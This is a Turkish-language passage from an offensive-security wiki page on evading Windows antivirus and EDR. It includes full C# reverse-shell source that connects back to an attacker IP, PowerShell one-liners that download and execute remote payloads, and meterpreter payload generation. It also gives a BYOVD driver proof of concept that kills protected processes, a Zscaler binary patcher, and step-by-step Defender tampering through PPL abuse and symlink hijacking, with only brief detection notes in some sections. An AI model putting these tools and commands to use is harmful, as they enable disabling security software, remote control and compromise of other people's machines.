Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), uygulamaların ve sistem bileşenlerinin **olayları kaydetmesine** izin veren Windows'ta güçlü bir kayıt mekanizmasıdır. Ancak, güvenlik ürünleri tarafından kötü amaçlı faaliyetleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin nasıl devre dışı bırakıldığına (by-pass edildiğine) benzer şekilde, kullanıcı alanı işleminin **`EtwEventWrite`** fonksiyonunun hiçbir olay kaydetmeden hemen dönecek şekilde değiştirilmesi de mümkündür. Bu, fonksiyonu bellekte yama yaparak hemen dönüş yapmasını sağlamak suretiyle gerçekleştirilir ve böylece o işlem için ETW kaydı etkisizleştirilmiş olur.

Daha fazla bilgi için bakabilirsiniz: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# ikili dosyalarının belleğe yüklenmesi uzun zamandır bilinen bir yöntemdir ve AV tarafından yakalanmadan post-exploitation araçlarınızı çalıştırmak için hâlâ çok iyi bir yoldur.

Payload doğrudan diske temas etmeden belleğe yükleneceği için, tüm işlem için yalnızca AMSI'yi yama (patch) yapma konusunda endişelenmemiz gerekecektir.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc, vb.) zaten C# assembly'lerini doğrudan bellekte çalıştırma yeteneği sunar, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntem, **yeni bir feda edilecek süreç (sacrificial process) oluşturmayı**, kötü amaçlı post-exploitation kodunuzu o yeni sürece enjekte etmeyi, kodu çalıştırmayı ve iş bittiğinde yeni süreci sonlandırmayı içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı yürütmenin Beacon implant işlemimizin **dışında** gerçekleşmesidir. Bu, post-exploitation eylemlerimiz sırasında bir şey ters gider veya yakalanırsa, implantımızın hayatta kalma şansının **çok daha yüksek** olması anlamına gelir. Dezavantajı ise **Davranışsal Tespitler (Behavioural Detections)** tarafından yakalanma şansınızın daha yüksek olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu, post-exploitation kötü amaçlı kodun **kendi sürecinin içine** enjekte edilmesiyle ilgilidir. Bu şekilde yeni bir süreç oluşturmak ve AV tarafından taranmasını sağlamak zorunda kalmazsınız, ancak dezavantajı payload yürütmesi sırasında bir şey ters giderse beacon'ınızı kaybetme olasılığının **çok daha yüksek** olmasıdır çünkü süreç çökebilir.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eğer C# Assembly yükleme hakkında daha fazla okumak isterseniz, şu makaleyi inceleyin: [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve onların InlineExecute-Assembly BOF'ı ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

PowerShell üzerinden de C# Assembly'leri yükleyebilirsiniz, bakınız [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in videosu](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) projesinde önerildiği gibi, saldırganın kontrolündeki SMB paylaşımında yüklü olan yorumlayıcı ortamına erişim vererek diğer diller kullanılarak kötü amaçlı kod çalıştırmak mümkündür.

SMB paylaşımındaki Interpreter Binaries ve ortamına erişim vererek, ele geçirilen makinenin belleği içinde bu dillerde **rastgele kod çalıştırabilirsiniz**.

Repo şöyle belirtiyor: Defender hâlâ script'leri tarıyor ama Go, Java, PHP vb. kullanarak **statik imzaları atlatmak için daha fazla esneklik** elde ediyoruz. Bu dillerde rastgele, obfuskasyon yapılmamış reverse shell script'leriyle yapılan testler başarılı olduğunu gösterdi.

## TokenStomping

Token stomping, bir saldırganın bir erişim token'ını veya bir EDR ya da AV gibi bir güvenlik ürününü **manipüle etmesine** olanak tanıyan bir tekniktir; bu sayede token'ın yetkileri düşürülür, süreç ölmez fakat kötü amaçlı faaliyetleri kontrol etme izinleri kalmaz.

Bunu engellemek için Windows, güvenlik süreçlerinin token'ları üzerinde dış süreçlerin tutamak (handle) elde etmesini engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**Bu blog yazısında**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı gibi, mağdurun PC'sine Chrome Remote Desktop kurup bunu ele geçirip kalıcılık sağlamak oldukça kolaydır:
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" seçeneğine tıklayın ve ardından Windows için MSI dosyasını indirmek üzere MSI dosyasına tıklayın.
2. Kurucuyu mağdur makinede sessizce çalıştırın (yönetici gereklidir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönüp next'e tıklayın. Sihirbaz devam etmek için yetki istiyor; devam etmek için Authorize butonuna tıklayın.
4. Verilen parametreyi bazı ayarlamalarla çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (GUI kullanmadan pin ayarlamaya izin veren pin parametresine dikkat edin).

## Advanced Evasion

Evasion (atlatma) çok karmaşık bir konudur; bazen tek bir sistemde birçok farklı telemetri kaynağını göz önünde bulundurmanız gerekir, bu yüzden olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkansızdır.

Her ortamın kendi güçlü ve zayıf yönleri olacaktır.

Daha gelişmiş Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94)'ın bu konuşmasını izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu aynı zamanda [@mariuszbit](https://twitter.com/mariuszbit)'in Evasion in Depth hakkında başka harika bir konuşmasıdır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanarak, Defender'ın hangi kısmı kötü amaçlı olarak bulduğunu bulana kadar ikili dosyanın parçalarını **kaldırabilir** ve hangi kısmın Defender tarafından kötü amaçlı bulunduğunu size **bölerek** gösterebilirsiniz.\
Aynı şeyi yapan başka bir araç ise [**avred**](https://github.com/dobin/avred) olup hizmeti açık web üzerinden [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde sunmaktadır.

### **Telnet Server**

Windows 10 öncesi tüm Windows sürümlerinde yönetici olarak kurabileceğiniz bir **Telnet server** vardı, bunu yüklemek için:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında **başlamasını** sağlayın ve şimdi **çalıştırın**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Change telnet port** (gizli) ve güvenlik duvarını devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

İndirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin indirmelerini tercih edin, setup değil)

**ON THE HOST**: _**winvnc.exe**_ çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ için bir parola ayarlayın
- _View-Only Password_ için bir parola ayarlayın

Daha sonra, ikili _**winvnc.exe**_ ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Reverse connection**

**attacker**, kendi **host** içinde `vncviewer.exe -listen 5900` ikili dosyasını **çalıştırmalı**, böylece reverse **VNC connection** yakalamaya **hazır** olur. Sonra, **victim** içinde: winvnc daemon'unu `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` çalıştırın

UYARI: Gizliliği korumak için bazı şeyleri yapmamalısınız

- `winvnc` zaten çalışıyorsa başlatmayın; aksi takdirde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc` başlatmayın; aksi halde [yapılandırma penceresi](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` çalıştırmayın; aksi takdirde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

İndirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT içinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi `msfconsole -r file.rc` ile **lister'ı başlatın** ve **xml payload**'ı **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut defender işlemi çok hızlı bir şekilde sonlandıracaktır.**

### Kendi reverse shell'imizi derlemek

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şunu kullanarak derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Şununla kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using derleyici
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve yürütme:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Build injector'ları oluşturmak için python kullanma örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603, ransomware teslim etmeden önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol aracını kullandı. Araç, **kendi zayıf ama *imzalı* sürücüsünü** getirir ve Protected-Process-Light (PPL) AV servislerinin bile engelleyemeyeceği ayrıcalıklı kernel işlemlerini gerçekleştirmek için bunu suistimal eder.

Önemli çıkarımlar
1. **Signed driver**: Diskte teslim edilen dosya `ServiceMouse.sys` olarak adlandırılıyor, ancak ikili aslında Antiy Labs’in “System In-Depth Analysis Toolkit” içinden meşru şekilde imzalanmış sürücü `AToolsKrnl64.sys`. Sürücü geçerli bir Microsoft imzası taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır sürücüyü bir **kernel servisi** olarak kaydeder ve ikinci satır başlatarak `\\.\ServiceMouse`'ın user land'den erişilebilir hale gelmesini sağlar.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD, user-mode korumalarını tamamen atlar; kernel'de çalışan kod, *korumalı* süreçleri açabilir, sonlandırabilir veya PPL/PP, ELAM veya diğer sertleştirme özelliklerine bakılmaksızın kernel nesneleriyle oynayabilir.

Detection / Mitigation
•  Microsoft’un vulnerable-driver block list (`HVCI`, `Smart App Control`) etkinleştirilsin, böylece Windows `AToolsKrnl64.sys` yüklemeyi reddeder.  
•  Yeni *kernel* servislerinin oluşturulmasını izleyin ve bir sürücü world-writable bir dizinden yükleniyorsa veya allow-list'te yoksa uyarı verin.  
•  Özel device object'lere açılan user-mode handle'ları ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izleyin.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’ın **Client Connector**'ı cihaz-posture kurallarını yerelde uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC’ye dayanır. İki zayıf tasarım tercihi tam bir bypass'ı mümkün kılar:

1. Posture değerlendirmesi **tamamen client-side** gerçekleşir (server'a bir boolean gönderilir).  
2. Dahili RPC endpoint'leri yalnızca bağlanan yürütülebilir dosyanın **Zscaler tarafından imzalanmış** olduğunu doğrular (`WinVerifyTrust` aracılığıyla).

Diskteki dört imzalı ikiliyi patchleyerek her iki mekanizma da etkisiz hale getirilebilir:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Always returns `1` so every check is compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Orijinal dosyalar değiştirildikten ve servis yığını yeniden başlatıldıktan sonra:

* **Tüm** posture kontrolleri **yeşil/uyumlu** olarak görünür.
* İmzalanmamış veya değiştirilmiş ikili dosyalar, adlandırılmış boru RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* İhlal edilmiş host, Zscaler politikalarıyla tanımlanan iç ağa sınırsız erişim kazanır.

Bu vaka çalışması, salt istemci tarafı güven kararlarının ve basit imza kontrollerinin birkaç baytlık yamayla nasıl alt edilebileceğini gösterir.

## Protected Process Light (PPL) kullanarak LOLBINs ile AV/EDR'e müdahale etmek

Protected Process Light (PPL), yalnızca eşit veya daha yüksek seviyedeki korumalı süreçlerin birbirlerine müdahale edebilmesini sağlayan bir imzalayıcı/seviye hiyerarşisi uygular. Saldırgan açısından, eğer meşru şekilde PPL etkin bir ikiliyi başlatabiliyor ve argümanlarını kontrol edebiliyorsanız, zararsız bir işlevselliği (ör. logging) AV/EDR tarafından kullanılan korumalı dizinlere yönelik sınırlı, PPL destekli bir yazma primitifine dönüştürebilirsiniz.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Açık kaynaklı yardımcı: CreateProcessAsPPL (koruma seviyesini seçer ve argümanları hedef EXE'ye iletir):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Kullanım deseni:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- İmzalı sistem ikili dosyası `C:\Windows\System32\ClipUp.exe` kendini başlatır ve çağıranın belirttiği bir yola log dosyası yazmak için bir parametre alır.
- PPL süreci olarak başlatıldığında, dosya yazma işlemi PPL desteği ile gerçekleşir.
- ClipUp boşluk içeren yolları ayrıştıramaz; normalde korunan konumlara işaret etmek için 8.3 kısa yolları kullanın.

8.3 short path helpers
- Kısa adları listeleme: her üst dizinde `dir /x`.
- cmd'de kısa yolu türetme: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL destekli LOLBIN'i (ClipUp) `CREATE_PROTECTED_PROCESS` ile bir başlatıcı kullanarak (örn. CreateProcessAsPPL) başlatın.
2) ClipUp log-yol argümanını, korumalı bir AV dizininde (örn. Defender Platform) dosya oluşturmayı zorlamak için verin. Gerekirse 8.3 kısa adları kullanın.
3) Hedef ikili dosya normalde çalışırken AV tarafından açık/kilitli ise (örn. MsMpEng.exe), yazmayı AV başlamadan önce önyüklemede gerçekleştirecek şekilde zamanlayın: daha önce güvenilir şekilde çalışacak bir otomatik başlatma servisi kurun. Önyükleme sıralamasını Process Monitor ile doğrulayın (boot logging).
4) Yeniden başlatmada PPL destekli yazma, AV ikili dosyalarını kilitlemeden önce gerçekleşir; hedef dosyayı bozar ve başlatmayı engeller.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notlar ve kısıtlamalar
- ClipUp'un yazdığı içeriği yalnızca konumlandırma açısından kontrol edebilirsiniz; bu primitif hassas içerik enjeksiyonundan ziyade bozulma (corruption) için uygundur.
- Servis kurmak/başlatmak ve yeniden başlatma penceresi için yerel admin/SYSTEM gerektirir.
- Zamanlama kritik: hedef dosya açık olmamalı; önyükleme zamanı yürütme dosya kilitlerinden kaçınır.

Tespitler
- Önyükleme civarında, özellikle ebeveyni standart olmayan başlatıcılar olan durumlarda, olağandışı argümanlarla `ClipUp.exe` süreç oluşturma.
- Otomatik başlatma olarak yapılandırılmış şüpheli ikili dosyaları çalıştıran yeni servisler ve Defender/AV'den önce sürekli başlayan servisler. Defender başlatma hatalarından önce servis oluşturma/değişikliğini araştırın.
- Defender ikili dosyaları/Platform dizinlerinde dosya bütünlüğü izleme; protected-process bayraklı süreçler tarafından beklenmeyen dosya oluşturma/değişiklikleri.
- ETW/EDR telemetri: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçleri ve AV olmayan ikili dosyalar tarafından kullanılan anormal PPL seviye kullanımını arayın.

Önlemler
- WDAC/Code Integrity: hangi imzalı ikili dosyaların PPL olarak çalışabileceğini ve hangi ebeveynler altında çalışabileceklerini kısıtlayın; meşru bağlamlar dışındaki ClipUp çağrılarını engelleyin.
- Servis hijyeni: otomatik başlatma servislerinin oluşturulmasını/değiştirilmesini kısıtlayın ve başlatma sırası manipülasyonunu izleyin.
- Defender tamper protection ve early-launch korumalarının etkin olduğundan emin olun; ikili dosya bozulmasını gösteren başlatma hatalarını araştırın.
- Güvenlik araçlarını barındıran hacimlerde ortamınızla uyumluysa 8.3 kısa ad (short-name) oluşturmayı devre dışı bırakmayı düşünün (iyice test edin).

PPL ve araçlar için referanslar
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Platform Version Folder Symlink Hijack yoluyla Microsoft Defender'a müdahale

Windows Defender, çalıştığı platformu şu alt klasörleri sayarak seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En büyük leksikografik sürüm stringine (ör. `4.18.25070.5-0`) sahip alt klasörü seçer ve ardından Defender servis süreçlerini oradan başlatır (hizmet/kayıt yolu bilgilerini buna göre günceller). Bu seçim dizin girdilerine ve dizin reparse noktalarına (symlinks) güvenir. Bir yönetici bunu Defender'ı saldırganın yazılabilir bir yoluna yönlendirmek ve DLL sideloading veya servis bozulması elde etmek için kullanabilir.

Önkoşullar
- Yerel Administrator (Platform klasörü altında dizin/symlink oluşturmak için gerekli)
- Yeniden başlatma yeteneği veya Defender platform yeniden seçim tetiklemesi (önyüklemede servis yeniden başlatması)
- Yalnızca yerleşik araçlar gereklidir (mklink)

Neden işe yarar
- Defender kendi klasörlerine yazılmasını engeller, ancak platform seçimi dizin girdilerine güvenir ve hedefin korumalı/güvenilir bir yola çözülüp çözülmediğini doğrulamadan leksikografik olarak en yüksek sürümü seçer.

Adım adım (örnek)
1) Mevcut platform klasörünün yazılabilir bir klonunu hazırlayın, örn. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden higher-version directory symlink oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)'in yönlendirilen yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni işlem yolunu `C:\TMP\AV\` altında ve hizmet yapılandırması/registry'nin bu konumu yansıttığını görmelisiniz.

Post-exploitation options
- DLL sideloading/code execution: Defender'ın uygulama dizininden yüklediği DLL'leri drop/replace ederek Defender'ın süreçlerinde kod çalıştırın. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink'i kaldırın, böylece bir sonraki başlatmada yapılandırılmış yol çözülmez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Bu teknik tek başına ayrıcalık yükseltme sağlamaz; yönetici hakları gerektirir.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams, runtime evasion'u C2 implant'tan hedef modülün kendisine taşıyabilirler: Import Address Table (IAT)ını hooklayıp seçili APIs çağrılarını attacker-controlled, position‑independent code (PIC) üzerinden yönlendirerek. Bu yaklaşım, evasion'ı birçok kitin expose ettiği küçük API yüzeyinin (ör. CreateProcessA) ötesine genelleştirir ve aynı korumayı BOFs ve post‑exploitation DLLs'lere de genişletir.

High-level approach
- Hedef modülün yanında reflective loader kullanarak bir PIC blob konumlandırın (prepended veya companion). PIC self‑contained ve position‑independent olmalıdır.
- Host DLL yüklenirken, IMAGE_IMPORT_DESCRIPTOR üzerinde gezinin ve hedeflenen importlar için IAT girdilerini (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ince, PIC wrapper'larına yönlendirecek şekilde patch'leyin.
